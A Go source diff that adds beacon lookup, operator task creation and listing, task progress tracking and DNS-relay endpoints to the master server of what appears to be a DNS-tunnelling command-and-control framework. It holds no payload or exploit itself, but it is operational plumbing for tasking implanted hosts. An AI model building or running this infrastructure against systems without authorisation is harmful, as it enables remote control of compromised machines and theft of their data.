@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"strconv"
 	"strings"
 	"time"
 
@@ -103,6 +104,16 @@ type ResultSubmitRequest struct {
 	ChunkIndex  int    `json:"chunk_index"`
 	TotalChunks int    `json:"total_chunks"`
 	Data        string `json:"data"`
+}
+
+type TaskProgressRequest struct {
+	DNSServerID   string `json:"dns_server_id"`
+	APIKey        string `json:"api_key"`
+	TaskID        string `json:"task_id"`
+	BeaconID      string `json:"beacon_id"`
+	ReceivedChunks int   `json:"received_chunks"`
+	TotalChunks    int   `json:"total_chunks"`
+	Status        string `json:"status"` // "receiving", "assembling", "complete"
 }
 
 // Middleware
@@ -471,12 +482,22 @@ func (api *APIServer) handleGetBeacon(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	beaconID := vars["id"]
 
-	// TODO: Implement GetBeacon in db.go for master
 	if api.config.Debug {
 		fmt.Printf("[API] Beacon details requested: %s\n", beaconID)
 	}
 
-	api.sendError(w, http.StatusNotImplemented, "beacon retrieval not yet implemented")
+	beacon, err := api.db.GetBeacon(beaconID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacon")
+		return
+	}
+
+	if beacon == nil {
+		api.sendError(w, http.StatusNotFound, "beacon not found")
+		return
+	}
+
+	api.sendJSON(w, beacon)
 }
 
 // Task Management Endpoints
@@ -492,19 +513,27 @@ func (api *APIServer) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 	operatorID := r.Header.Get("X-Operator-ID")
 	username := r.Header.Get("X-Operator-Username")
 
-	// TODO: Implement CreateTask in db.go for master
-	// For now, just log and acknowledge
+	// Create task in database
+	taskID, err := api.db.CreateTask(req.BeaconID, req.Command, operatorID)
+	if err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] ❌ Failed to create task: %v\n", err)
+		}
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to create task: %v", err))
+		return
+	}
 
 	if api.config.Debug {
-		fmt.Printf("[API] Task created by %s: %s for beacon %s\n",
-			username, req.Command, req.BeaconID)
+		fmt.Printf("[API] ✅ Task %s created by %s: '%s' for beacon %s\n",
+			taskID, username, req.Command, req.BeaconID)
 	}
 
 	// Log task creation
-	api.db.LogAuditEvent(operatorID, "task_create", "task", req.BeaconID,
-		fmt.Sprintf("Created task: %s", req.Command), r.RemoteAddr)
+	api.db.LogAuditEvent(operatorID, "task_create", "task", taskID,
+		fmt.Sprintf("Created task for beacon %s: %s", req.BeaconID, req.Command), r.RemoteAddr)
 
 	api.sendSuccess(w, "task created", map[string]interface{}{
+		"task_id":   taskID,
 		"beacon_id": req.BeaconID,
 		"command":   req.Command,
 		"status":    "pending",
@@ -513,8 +542,24 @@ func (api *APIServer) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 
 // handleListTasks returns all tasks
 func (api *APIServer) handleListTasks(w http.ResponseWriter, r *http.Request) {
-	// TODO: Implement GetAllTasks in db.go for master
-	api.sendJSON(w, []interface{}{})
+	// Get optional limit parameter
+	limitStr := r.URL.Query().Get("limit")
+	limit := 100 // default
+	if limitStr != "" {
+		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
+			limit = l
+		}
+	}
+
+	tasks, err := api.db.GetAllTasks(limit)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
+		return
+	}
+
+	api.sendJSON(w, map[string]interface{}{
+		"tasks": tasks,
+	})
 }
 
 // handleGetTask returns details for a specific task
@@ -522,12 +567,21 @@ func (api *APIServer) handleGetTask(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	taskID := vars["id"]
 
-	// TODO: Implement GetTask in db.go for master
-	if api.config.Debug {
-		fmt.Printf("[API] Task details requested: %s\n", taskID)
+	task, err := api.db.GetTaskWithResult(taskID)
+	if err != nil {
+		if err.Error() == "task not found" {
+			api.sendError(w, http.StatusNotFound, "task not found")
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to retrieve task")
+		}
+		return
 	}
 
-	api.sendError(w, http.StatusNotImplemented, "task retrieval not yet implemented")
+	if api.config.Debug {
+		fmt.Printf("[API] Task details retrieved: %s (status: %s)\n", taskID, task["status"])
+	}
+
+	api.sendJSON(w, task)
 }
 
 // handleGetTaskResult returns the result for a specific task
@@ -581,6 +635,18 @@ func (api *APIServer) handleGetTasksForDNSServer(w http.ResponseWriter, r *http.
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
 		return
+	}
+
+	// Mark tasks as 'sent' to prevent duplicate polling
+	if len(tasks) > 0 {
+		taskIDs := make([]string, len(tasks))
+		for i, task := range tasks {
+			taskIDs[i] = task["id"].(string)
+		}
+		
+		if err := api.db.MarkTasksSent(taskIDs); err != nil && api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to mark tasks as sent: %v\n", err)
+		}
 	}
 
 	if api.config.Debug && len(tasks) > 0 {
@@ -660,6 +726,57 @@ func (api *APIServer) handleSubmitResult(w http.ResponseWriter, r *http.Request)
 	})
 }
 
+// handleSubmitProgress processes task progress updates from DNS servers
+func (api *APIServer) handleSubmitProgress(w http.ResponseWriter, r *http.Request) {
+	var req TaskProgressRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Update task progress in database
+	err := api.db.UpdateTaskProgress(
+		req.TaskID,
+		req.BeaconID,
+		dnsServerID,
+		req.ReceivedChunks,
+		req.TotalChunks,
+		req.Status,
+	)
+
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to update progress")
+		if api.config.Debug {
+			fmt.Printf("[API] Error updating progress: %v\n", err)
+		}
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Progress update from %s: Task %s - %d/%d chunks (%s)\n",
+			dnsServerID, req.TaskID, req.ReceivedChunks, req.TotalChunks, req.Status)
+	}
+
+	api.sendSuccess(w, "progress updated", nil)
+}
+
+// handleGetTaskProgress returns progress information for a specific task
+func (api *APIServer) handleGetTaskProgress(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	taskID := vars["id"]
+
+	// Use the results-based progress calculation for accurate operator view
+	progress, err := api.db.GetTaskProgressFromResults(taskID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve progress")
+		return
+	}
+
+	api.sendJSON(w, progress)
+}
+
 // handleStats returns master server statistics
 func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
 	stats, err := api.db.GetDatabaseStats()
@@ -677,6 +794,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	router.HandleFunc("/", api.handleRoot).Methods("GET")
 	router.HandleFunc("/login", api.handleLoginPage).Methods("GET")
 	router.HandleFunc("/dashboard", api.handleDashboardPage).Methods("GET")
+	router.HandleFunc("/beacon", api.handleBeaconPage).Methods("GET")
 
 	// Serve static files (CSS, JS, images)
 	router.PathPrefix("/web/static/").Handler(
@@ -698,6 +816,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	operatorRouter.HandleFunc("/tasks", api.handleListTasks).Methods("GET")
 	operatorRouter.HandleFunc("/tasks/{id}", api.handleGetTask).Methods("GET")
 	operatorRouter.HandleFunc("/tasks/{id}/result", api.handleGetTaskResult).Methods("GET")
+	operatorRouter.HandleFunc("/tasks/{id}/progress", api.handleGetTaskProgress).Methods("GET")
 	operatorRouter.HandleFunc("/stats", api.handleStats).Methods("GET")
 
 	// DNS server endpoints (API key auth required)
@@ -707,6 +826,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/checkin", api.handleDNSServerCheckin).Methods("POST")
 	dnsRouter.HandleFunc("/beacon", api.handleBeaconReport).Methods("POST")
 	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
+	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
 	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
 	dnsRouter.HandleFunc("/beacons", api.handleGetBeaconsForDNSServer).Methods("GET")
 
@@ -729,4 +849,8 @@ func (api *APIServer) handleLoginPage(w http.ResponseWriter, r *http.Request) {
 
 func (api *APIServer) handleDashboardPage(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, "./web/dashboard.html")
+}
+
+func (api *APIServer) handleBeaconPage(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, "./web/beacon.html")
 }
